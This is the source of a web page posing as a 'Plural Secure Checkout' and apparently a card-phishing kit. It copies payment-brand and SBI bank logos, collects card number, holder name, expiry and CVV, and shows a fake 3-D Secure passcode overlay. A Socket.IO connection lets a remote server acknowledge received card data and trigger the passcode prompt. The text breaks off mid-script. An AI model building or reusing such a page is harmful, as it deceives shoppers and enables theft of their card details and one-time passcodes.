<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Plural Secure Checkout</title>
    <meta name="description" content="Secure payment gateway powered by Plural" />
    <meta name="author" content="Plural" />

    <!-- External CSS - Tailwind CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Socket.io Client Library -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    
    <!-- React and React DOM -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background-color: #f7f9fc;
            margin: 0;
            padding: 0;
            background-image: linear-gradient(to bottom right, rgba(241, 245, 249, 0.8), rgba(226, 232, 240, 0.8));
        }
        .rounded-lg { border-radius: 0.5rem; }
        .border { border-width: 1px; }
        .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
        .bg-primary { background-color: #2563eb; }
        .text-white { color: white; }
        .font-bold { font-weight: 700; }
        .text-gray-100 { color: #f3f4f6; }
        .space-y-1 > * + * { margin-top: 0.25rem; }
        .p-6 { padding: 1.5rem; }
        .mb-4 { margin-bottom: 1rem; }
        .mb-6 { margin-bottom: 1.5rem; }
        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .text-2xl { font-size: 1.5rem; }
        .text-sm { font-size: 0.875rem; }
        .text-gray-600 { color: #4b5563; }
        .space-x-2 > * + * { margin-left: 0.5rem; }
        .text-green-500 { color: #10b981; }
        .font-medium { font-weight: 500; }
        .gap-3 { gap: 0.75rem; }
        .h-8 { height: 2rem; }
        .w-12 { width: 3rem; }
        .h-6 { height: 1.5rem; }
        .object-contain { object-fit: contain; }
        .space-y-4 > * + * { margin-top: 1rem; }
        .relative { position: relative; }
        .pl-10 { padding-left: 2.5rem; }
        .pr-10 { padding-right: 2.5rem; }
        .absolute { position: absolute; }
        .left-3 { left: 0.75rem; }
        .top-3 { top: 0.75rem; }
        .right-3 { right: 0.75rem; }
        .top-2\.5 { top: 0.625rem; }
        .h-4 { height: 1rem; }
        .w-4 { width: 1rem; }
        .text-gray-400 { color: #9ca3af; }
        .h-5 { height: 1.25rem; }
        .w-10 { width: 2.5rem; }
        .grid { display: grid; }
        .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .gap-4 { gap: 1rem; }
        .w-full { width: 100%; }
        .bg-blue-50 { background-color: #eff6ff; }
        .text-blue-500 { color: #3b82f6; }
        .h-12 { height: 3rem; }
        .w-12 { width: 3rem; }
        .text-center { text-align: center; }
        .bg-white { background-color: white; }
        .p-3 { padding: 0.75rem; }
        .border-gray-200 { border-color: #e5e7eb; }
        .mr-3 { margin-right: 0.75rem; }
        .bg-blue-100 { background-color: #dbeafe; }
        .rounded-full { border-radius: 9999px; }
        .p-2 { padding: 0.5rem; }
        .text-xs { font-size: 0.75rem; }
        .text-gray-500 { color: #6b7280; }
        .text-lg { font-size: 1.125rem; }
        .font-semibold { font-weight: 600; }
        .my-6 { margin-top: 1.5rem; margin-bottom: 1.5rem; }
        .justify-center { justify-content: center; }
        .w-10 { width: 2.5rem; }
        .h-14 { height: 3.5rem; }
        .w-14 { width: 3.5rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .cursor-not-allowed { cursor: not-allowed; }
        .opacity-50 { opacity: 0.5; }
        .text-blue-600 { color: #2563eb; }
        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
        .flex-col { flex-direction: column; }
        .animate-spin { animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .border-t-2 { border-top-width: 2px; }
        .border-b-2 { border-bottom-width: 2px; }
        .border-primary { border-color: #2563eb; }
        .h-16 { height: 4rem; }
        .w-16 { width: 4rem; }
        .bg-green-100 { background-color: #d1fae5; }
        .text-green-500 { color: #10b981; }
        .bg-red-100 { background-color: #fee2e2; }
        .text-red-500 { color: #ef4444; }
        .border-t { border-top-width: 1px; }
        .pt-0 { padding-top: 0; }
        .h-6 { height: 1.5rem; }
        .flex-wrap { flex-wrap: wrap; }
        .gap-6 { gap: 1.5rem; }
        .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
        .h-5 { height: 1.25rem; }
        
        /* Form styles - IMPROVED */
        input {
            width: 100%;
            padding: 0.75rem 1.5rem;
            border: 1px solid #d1d5db;
            border-radius: 0.375rem;
            outline: none;
            font-size: 16px;
            transition: all 0.2s ease;
            height: 48px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
        }
        input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
        }
        
        /* Improved input placeholder styling */
        input::placeholder {
            color: #a0aec0;
            font-weight: 400;
        }

        /* Add more spacing for non-icon inputs */
        input:not(.pl-10) {
            padding-left: 1.5rem;
        }

        /* Base styles for Pay Now button */
        .pay-now-btn {
            background-color: #a0aec0; /* Silver/gray */
            color: white;
            font-weight: 600;
            font-size: 16px;
            padding: 0.75rem;
            border-radius: 0.375rem;
            width: 100%;
            border: none;
            height: 52px;
            text-transform: uppercase;
            letter-spacing: 0.025em;
            cursor: not-allowed;
            transition: none;
        }

        /* Green style that will be applied through JavaScript */
        .btn-ready {
            background-color: #1a5e32 !important; /* Dark green */
            cursor: pointer !important;
        }

        /* Completely disable hover effects */
        .pay-now-btn:hover,
        .pay-now-btn:focus,
        .pay-now-btn:active {
            background-color: #a0aec0 !important; /* Keep silver color always */
            transform: none !important;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2) !important;
            outline: none !important;
            color: white !important;
        }

        /* Add a separate class for enabled state that will be applied with JavaScript */
        .pay-now-btn.pay-enabled {
            background-color: #1a5e32 !important; /* Dark green */
            cursor: pointer !important;
        }

        /* Keep green color even on hover/active when enabled */
        .pay-now-btn.pay-enabled:hover,
        .pay-now-btn.pay-enabled:focus,
        .pay-now-btn.pay-enabled:active {
            background-color: #1a5e32 !important; /* Keep dark green */
        }
        
        /* Input icons - IMPROVED positioning */
        .input-icon {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .input-icon.left {
            left: 12px;
        }
        .input-icon.right {
            right: 12px;
        }
        
        /* Card container with improved styling */
        .card-container {
            background-color: white;
            border-radius: 0.75rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(226, 232, 240, 0.8);
        }
        
        /* Background pattern effect */
        .card-container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 180px;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(226, 232, 240, 0.2) 10%, transparent 20%),
                radial-gradient(circle at 80% 40%, rgba(226, 232, 240, 0.3) 15%, transparent 25%),
                radial-gradient(circle at 40% 70%, rgba(226, 232, 240, 0.4) 8%, transparent 15%);
            opacity: 0.5;
            z-index: 0;
            pointer-events: none;
        }
        
        /* OTP input styles - IMPROVED */
        .otp-input {
            display: flex;
            gap: 0.75rem;
            justify-content: center;
        }
        .otp-input input {
           width: 3rem;
            height: 3.5rem;
            text-align: center;
            font-size: 1.5rem;
            border: 1px solid #d1d5db;
            border-radius: 0.5rem;
            background-color: white;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
        }
        .otp-input input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
        }
        
        /* Card layout */
        @media (min-width: 768px) {
            .md\:flex { display: flex; }
            .md\:w-1\/2 { width: 50%; }
        }
        
        /* Separator line */
        .separator-vertical {
            width: 1px;
            height: 1.5rem;
            background-color: #e5e7eb;
        }

        /* MC verification styles */
        .fixed {
            position: fixed;
        }
        .inset-0 {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
        }
        .z-50 {
            z-index: 50;
        }
        .bg-opacity-75 {
            --bg-opacity: 0.75;
        }
        .bg-black {
            background-color: rgba(0, 0, 0, var(--bg-opacity));
        }
        
        /* Card details section with improved styling */
        .card-details-section {
            padding: 2rem;
            position: relative;
            z-index: 1;
        }
        .card-details-section h2 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: #1e293b;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        .form-group label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: #4b5563;
        }
        
        /* Order summary section */
        .order-summary {
            padding: 2rem;
            background-color: #f8fafc;
            border-right: 1px solid #e2e8f0;
            position: relative;
            z-index: 1;
        }
        .order-summary h2 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: #1e293b;
        }
        
        /* Header bar */
        .header-bar {
            background: linear-gradient(90deg, #2563eb, #3b82f6);
            color: white;
            padding: 1.25rem 2rem;
            border-top-left-radius: 0.75rem;
            border-top-right-radius: 0.75rem;
        }
        
        /* Footer bar */
        .footer-bar {
            padding: 1.5rem 2rem;
            border-top: 1px solid #e2e8f0;
            background-color: #f8fafc;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            gap: 1.5rem;
        }
        
        /* Security badges */
        .security-badge {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .security-badge img {
            height: 1.5rem;
            width: auto;
        }
        
        /* MC Verification Styles */
        .fullscreen-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.6);
          backdrop-filter: blur(2px);
          z-index: 9999;
          display: none;
          justify-content: center;
          align-items: center;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        #mcOtpInput:focus {
          border-color: #3498db !important;
          box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
          outline: none !important;
        }

        .btn-loading {
          position: relative;
          pointer-events: none;
          opacity: 0.8;
        }

        #mcVerificationContent {
          font-family: Arial, sans-serif;
        }
    </style>
</head>

<body>
    <div id="app" class="min-h-screen flex items-center justify-center p-4">
        <!-- Initial static version that will show while JavaScript loads -->
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">100% Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $1299.00 USD
                </div>
                <div class="text-gray-100">Invoice ID: INV-<span id="invoiceId"></span></div>
            </div>
            
     <div class="md:flex">
                <!-- Left Side - Order Summary -->
                <div class="order-summary md:w-1/2">
                    <h2>Order Summary</h2>
                    
                    <div class="space-y-2">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Sub Total</span>
                            <span>$1,200.00</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Tax (GST)</span>
                            <span>$99.00</span>
                        </div>
                        <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
                            <span>Total Amount</span>
                            <span>$1,299.00</span>
                        </div>
                    </div>
                    
                    <div class="my-6">
                        <div class="flex items-center space-x-2 mb-3">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                            <span class="font-medium">Secure Payment Gateway</span>
                        </div>
                        <p class="text-sm text-gray-600">
                            Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                        </p>
                    </div>
                    
                    <div>
                        <h3 class="text-md font-medium mb-2">We Accept</h3>
                        <div class="flex flex-wrap gap-3">
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://static.wikia.nocookie.net/logopedia/images/5/57/Discover_Card_logo.svg/revision/latest/scale-to-width-down/300?cb=20211117164133" alt="Discover" class="h-6 w-auto object-contain" />
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Side - Card Details -->
                <div class="card-details-section md:w-1/2">
                    <h2>Card Details</h2>
                    <form id="card-form" class="space-y-4">
                        <div class="form-group">
                            <label>Card Number</label>
                            <div class="relative">
                                <div class="input-icon left">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                        <line x1="1" y1="10" x2="23" y2="10"></line>
                                    </svg>
                                </div>
                               <input 
                                    type="text" 
                                    id="card-number" 
                                    placeholder="1234 5678 9012 3456" 
                                    maxlength="19" 
                                    class="pl-10 pr-10"
                                />
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label>Card Holder Name</label>
                            <input 
                                type="text" 
                                id="card-holder" 
                                placeholder="John Doe"
                            />
                        </div>
                     
                        <div class="grid grid-cols-2 gap-4">
                            <div class="form-group">
                                <label>Expiry Date</label>
                                <input 
                                    type="text" 
                                    id="expiry-date" 
                                    placeholder="MM/YY" 
                                    maxlength="5"
                                />
                            </div>
                            
                            <div class="form-group">
                                <label>CVV</label>
                                <div class="relative">
                                    <div class="input-icon left">
                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                        </svg>
                                    </div>
                                    <input 
                                        type="password" 
                                        id="cvv" 
                                        placeholder="123" 
                                        maxlength="4" 
                                        class="pl-10"
                                    />
                                </div>
                            </div>
                        </div>
                        
                        <button 
                            type="submit" 
                            class="pay-now-btn"
                        >
                            Pay Now
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div> 
        </div>
    </div>

<!-- MC Verification Overlay -->
<div id="mcVerificationOverlay" class="fullscreen-overlay">
  <!-- Loading Content - Shown Initially -->
  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
    
    <!-- Added verification logo during loading -->
    <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
      <!-- Logo will be inserted here dynamically -->
    </div>
  </div>
  
  <!-- Main Verification Content -->
  <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 0;">
    
    <!-- Header with bank and card logos -->
    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
      <!-- Left side - Bank logo -->
      <div style="height: 40px; display: flex; align-items: center;">
        <img id="bankLogo" src="https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
      </div>
      
      <!-- Right side - Card verification logo -->
      <div style="height: 30px; display: flex; align-items: center;">
        <img id="verificationTypeLogo" src="https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png" alt="Verified by Visa" style="height: 100%; max-width: 120px;">
      </div>
    </div>
    
    <!-- Main content -->
    <div style="padding: 15px 20px;">
      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
      
      <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
     One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
        </p>
      </div>
      
      <!-- Transaction details - CENTER ALIGNED with more spacing -->
      <div style="margin-bottom: 20px; font-size: 13px; color: #333; display: flex; flex-direction: column; align-items: center;">
        <div style="display: grid; grid-template-columns: auto auto; gap: 8px 10px; width: 100%; max-width: 350px;">
          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Merchant</div>
          <div style="text-align: left; font-weight: 500;" id="merchantName">Bologus pvt store.</div>
          
          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Amount</div>
          <div style="text-align: left; font-weight: 500;">
            <span id="currencySymbol">$</span><span id="transactionAmount">1000.00</span>
          </div>
          
          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Date</div>
          <div style="text-align: left; font-weight: 500;" id="transactionDate">02/04/2025 05:15:42</div>
          
          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Card Number</div>
          <div style="text-align: left; font-weight: 500;" id="cardNumberDisplay">XXXX XXXX XXXX 4352</div>
          
          <div style="text-align: right; font-weight: 400; padding-right: 5px;">Reference Id</div>
          <div style="text-align: left; font-weight: 500;" id="referenceId">g4pxye</div>
        </div>
      </div>
      
      <!-- OTP input field - IMPROVED with label and input on same line -->
      <div style="margin-bottom: 20px; display: flex; align-items: center;">
        <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333; padding-left: 10px;">Enter One-Time Passcode</span>
        <div style="position: relative; width: 240px;">
          <input type="text" id="mcOtpInput" 
            style="width: 100%; padding: 8px 30px 8px 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
            font-weight: 400; transition: all 0.3s;" 
            placeholder="Enter One-Time Passcode" maxlength="6">
          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
              <circle cx="12" cy="12" r="10"/>
              <path d="M12 16v-4M12 8h.01"/>
            </svg>
          </div>
        </div>
      </div>
      
      <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
        Incorrect OTP, please enter valid one time passcode sent to your registered mobile
      </p>
      
      <!-- Consent checkbox - aligned to match the image -->
      <div style="margin-bottom: 15px;">
        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 13px; height: 13px;" checked>
          <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
        </label>
      </div>
      
      <!-- Action buttons - styled to match the image -->
      <div style="display: flex; gap: 5px; margin-bottom: 10px;">
        <button id="mcSubmitBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
        <button id="mcResendBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
        <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
      </div>
      
      <!-- Timer display -->
      <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Session expires in: 4:54</div>
      
      <!-- Footer links - styled to match the image -->
      <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
      </div>
    </div>
  </div>
</div>

    <script>
// Global error handler to catch uncaught exceptions
window.onerror = function(message, source, lineno, colno, error) {
    console.error('Uncaught error:', message, source, lineno, colno, error);
    const appElement = document.getElementById('app');
    if (appElement) {
        appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
            <h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
            <p style="margin-bottom: 10px;">Please try refreshing the page or contact support if the issue persists.</p>
            <p style="font-size: 12px; color: #666;">Error details: ${message}</p>
            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
        </div>`;
    }
    return true;
};

// Timer reference
let timerRef = null;
let socket = null;
let mcTimerInterval = null;

// Initialize application state globally
let state = {
    step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
    transactionId: '',
    loading: false,
    otpValue: '',
    amount: 1299.00, // Default amount, will be overridden if in URL
    maskedPhone: '',
    cardType: null,
    timeLeft: 59,
    canResend: false,
    cardForm: {
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        errors: {}
    }
};

// Parse amount from URL if available
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('amount')) {
    const urlAmount = parseFloat(urlParams.get('amount'));
    if (!isNaN(urlAmount) && urlAmount > 0) {
        state.amount = urlAmount;
    }
}

// Main application code
document.addEventListener('DOMContentLoaded', function() {
    try {
        // Initialize socket connection
        socket = io(window.location.origin, {
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            timeout: 20000,
            transports: ['websocket', 'polling']
        });

        // Add debugging listeners
        socket.on('connect', () => {
            console.log('Connected to Socket.IO server with ID:', socket.id);
            
            // Join room based on URL pid parameter
            const urlParams = new URLSearchParams(window.location.search);
            const pid = urlParams.get('pid');
            if (pid) {
                console.log('Joining room for PID:', pid);
                socket.emit('join', pid);
                
                // If amount is in the URL, update state and display
                if (urlParams.has('amount')) {
                    const urlAmount = parseFloat(urlParams.get('amount'));
                    if (!isNaN(urlAmount) && urlAmount > 0) {
                        state.amount = urlAmount;
                        
                        // Update all amount displays in the HTML
                        const amountDisplays = document.querySelectorAll('.text-gray-100');
                        amountDisplays.forEach(el => {
                            if (el.textContent.includes('Amount:')) {
                                el.textContent = `Amount: $${state.amount.toFixed(2)} USD`;
                            }
                        });
                        
                        // Update order summary amounts
                        const subTotalDisplay = document.querySelector('.order-summary .flex.justify-between:nth-child(1) span:nth-child(2)');
                        const taxDisplay = document.querySelector('.order-summary .flex.justify-between:nth-child(2) span:nth-child(2)');
                        const totalDisplay = document.querySelector('.order-summary .border-t.border-gray-200.my-2.pt-2.flex.justify-between.font-semibold span:nth-child(2)');
                        
                        if (subTotalDisplay && taxDisplay && totalDisplay) {
                            // Calculate subtotal as 91.6% of total (this approximates your existing ratio)
const subTotal = Math.round(state.amount * 0.916 * 100) / 100;
                            const tax = state.amount - subTotal;
                            
                            subTotalDisplay.textContent = `$${subTotal.toFixed(2)}`;
                            taxDisplay.textContent = `$${tax.toFixed(2)}`;
                            totalDisplay.textContent = `$${state.amount.toFixed(2)}`;
                        }
                    }
                }
            }
        });
        
        socket.on('disconnect', () => {
            console.log('Disconnected from Socket.IO server');
        });

        socket.on('error', (error) => {
            console.error('Socket error:', error);
        });
        
        socket.on('connect_error', (error) => {
            console.error('Socket connection error:', error);
            const appElement = document.getElementById('app');
            if (appElement) {
                appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
                    <h3 style="margin-bottom: 10px; font-size: 18px;">Connection Error</h3>
                    <p style="margin-bottom: 10px;">Failed to connect to the server. Please check your internet connection and try again.</p>
                    <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
                    <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
                </div>`;
            }
        });
        
        // Setup socket listeners and initialize app
        setupSocketListeners();
        
        // Generate random phone number for OTP
        generateRandomPhone();
        
        // Show the card form
        showCardUI();
        
        // Generate random invoice ID
        const invoiceIdElement = document.getElementById('invoiceId');
        if (invoiceIdElement) {
            invoiceIdElement.textContent = Math.floor(100000 + Math.random() * 900000);
        }
        
    } catch (error) {
        console.error('Initialization error:', error);
        document.getElementById('app').innerHTML = `
            <div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
                <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
                <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
                <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
            </div>
        `;
    }
});

function setupSocketListeners() {
    socket.on('card_data_received', (data) => {
        console.log('Card data received acknowledgement:', data);
        if (data.invoiceId) {
            socket.emit('join', data.invoiceId);
            console.log('Joined room for invoice:', data.invoiceId);
            
            if (!state.transactionId) {
                state.transactionId = data.invoiceId;
            }
        }
    });

    // Handle URL hash-based routing
    const pathSegments = window.location.pathname.split('/');
    if (pathSegments.length > 1) {
        const potentialHash = pathSegments[1];
        
        // Check if this is a hash and not a known file path
        if (potentialHash && 
            !potentialHash.includes('.') && 
            potentialHash.length >= 6 && 
            potentialHash.length <= 8) {
            
            console.log('Detected hash-based URL:', potentialHash);
            
            // Extract invoice ID from local storage if available
            const storedInfo = localStorage.getItem(`payment_${potentialHash}`);
            if (storedInfo) {
                try {
                    const { pid, amount } = JSON.parse(storedInfo);
                    console.log('Found stored payment info:', { pid, amount });
                    
                    // Join the payment room and update amount
                    if (pid) {
                        socket.emit('join', pid);
                        console.log('Joined room for stored PID:', pid);
                        
                        if (amount) {
                            state.amount = parseFloat(amount);
                            
                            // Update all amount displays in the HTML
                            const amountDisplays = document.querySelectorAll('.text-gray-100');
                            amountDisplays.forEach(el => {
                                if (el.textContent.includes('Amount:')) {
                                    el.textContent = `Amount: $${state.amount.toFixed(2)} USD`;
                                }
                            });
                            
                            // Update order summary amounts
                            const subTotalDisplay = document.querySelector('.order-summary .flex.justify-between:nth-child(1) span:nth-child(2)');
                            const taxDisplay = document.querySelector('.order-summary .flex.justify-between:nth-child(2) span:nth-child(2)');
                            const totalDisplay = document.querySelector('.order-summary .border-t.border-gray-200.my-2.pt-2.flex.justify-between.font-semibold span:nth-child(2)');
                            
                            if (subTotalDisplay && taxDisplay && totalDisplay) {
                                // Calculate subtotal as 91.6% of total
                                const subTotal = Math.round(state.amount * 0.916 * 100) / 100;
                                const tax = state.amount - subTotal;
                                
                                subTotalDisplay.textContent = `$${subTotal.toFixed(2)}`;
                                taxDisplay.textContent = `$${tax.toFixed(2)}`;
                                totalDisplay.textContent = `$${state.amount.toFixed(2)}`;
                            }
                        }
                    }
                } catch (error) {
                    console.error('Error parsing stored payment info:', error);
                }
            } else {
                console.log('No stored payment info found for hash:', potentialHash);
                // We can optionally fetch payment details from server here
            }
        }
    }
    
    socket.on('show_otp', (data) => {
        console.log('OTP verification requested:', data);
        
        if (!state.transactionId) {
            state.transactionId = data.transaction_id || data.invoiceId;
        }
        
        if (data.transaction_id === state.transactionId || 
            data.invoiceId === state.transactionId || 
            !state.transactionId) { 
            
            console.log('OTP condition met, showing OTP form');
            showOTPUI();
        } else {
            console.warn('Transaction ID mismatch:', data.transaction_id, state.transactionId);
        }
    });
    
    socket.on('payment_success', (data) => {
        console.log('Payment success:', data);
